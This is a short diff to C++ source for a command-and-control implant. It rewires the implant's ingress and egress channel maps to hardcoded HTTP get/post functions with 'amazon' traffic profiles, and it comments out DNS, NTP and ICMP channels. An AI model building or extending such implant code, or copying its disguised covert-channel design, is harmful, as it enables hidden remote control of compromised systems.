@@ -1,6 +1,7 @@
 #include "c2.h"
 #include "../protocols/json/json.h"
 #include "../data/msgpack/msgpack.h"
+#include "../lifecycle/comms.h" //comms has all the funcs for comms
 // ======================================================================================
 // 0. STATIC MEMBER DEFINITIONS
 // ======================================================================================
@@ -45,11 +46,13 @@ void post_ICMP(std::string implant_uuid, std::string text_data, std::string task
 //jinja this
 void C2Implant::init() {
     // Mapping Enums to Functions
-    s_ingress_map["http_get_amazon"] = get_HTTP;
-    s_ingress_map["dns_get_amazon"] = get_DNS;
+    s_ingress_map["http_get_amazon"] = http_get; //temp hardcode
+    //s_ingress_map["dns_get_amazon"] = get_DNS;
 
-    s_egress_map["ntp_post_profile1"] = post_NTP;
-    s_egress_map["icmp_post_profile1"] = post_ICMP;
+    s_egress_map["http_post_amazon"] = http_post; //temp hardcode
+
+    //s_egress_map["ntp_post_profile1"] = post_NTP;
+    //s_egress_map["icmp_post_profile1"] = post_ICMP;
 
 }
 
